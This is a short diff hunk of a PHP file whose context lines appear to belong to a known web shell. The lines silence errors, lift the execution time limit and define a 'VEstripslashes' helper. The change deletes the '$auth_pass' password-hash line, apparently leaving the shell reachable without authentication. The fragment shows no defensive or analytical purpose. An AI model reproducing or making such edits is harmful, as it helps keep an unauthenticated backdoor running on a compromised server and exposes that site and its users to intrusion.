@@ -17,7 +17,6 @@
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$auth_pass = '061abcf5c5410c21e9330e37dc0b7f34';
 if(get_magic_quotes_gpc()) {
 function VEstripslashes($array) {
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);} 	
